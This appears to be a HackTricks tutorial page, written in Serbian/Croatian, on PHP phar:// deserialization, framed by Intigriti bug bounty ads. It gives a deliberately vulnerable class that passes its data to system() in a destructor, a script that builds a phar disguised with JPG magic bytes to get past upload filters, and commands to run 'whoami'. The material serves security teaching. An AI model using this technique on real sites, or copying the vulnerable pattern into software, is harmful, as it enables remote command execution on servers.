# phar:// deserialization

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Phar** fajlovi (PHP Archive) **sadrže meta podatke u serijalizovanom formatu**, tako da, kada se analiziraju, ovi **metapodaci** se **deserijalizuju** i možete pokušati da iskoristite **deserijalizaciju** ranjivost unutar **PHP** koda.

Najbolja stvar u vezi sa ovom karakteristikom je da će se ova deserijalizacija dogoditi čak i korišćenjem PHP funkcija koje ne izvršavaju PHP kod kao što su **file_get_contents(), fopen(), file() ili file_exists(), md5_file(), filemtime() ili filesize()**.

Dakle, zamislite situaciju u kojoj možete naterati PHP veb da dobije veličinu proizvoljnog fajla koristeći **`phar://`** protokol, i unutar koda pronađete **klasu** sličnu sledećoj:
```php:vunl.php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
Možete kreirati **phar** datoteku koja će, kada se učita, **iskoristiti ovu klasu za izvršavanje proizvoljnih komandi** sa nečim poput:
```php:create_phar.php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
Napomena kako su **magične bajtove JPG** (`\xff\xd8\xff`) dodate na početak phar datoteke da bi se **zaobišle** **moguće** **restrikcije** **upload-a** **datoteka**.\
**Kompajlirajte** datoteku `test.phar` sa:
```bash
php --define phar.readonly=0 create_phar.php
```
I izvršite `whoami` komandu zloupotrebljavajući ranjivi kod sa:
```bash
php vuln.php
```
### Reference

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty savjet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite zarađivati nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
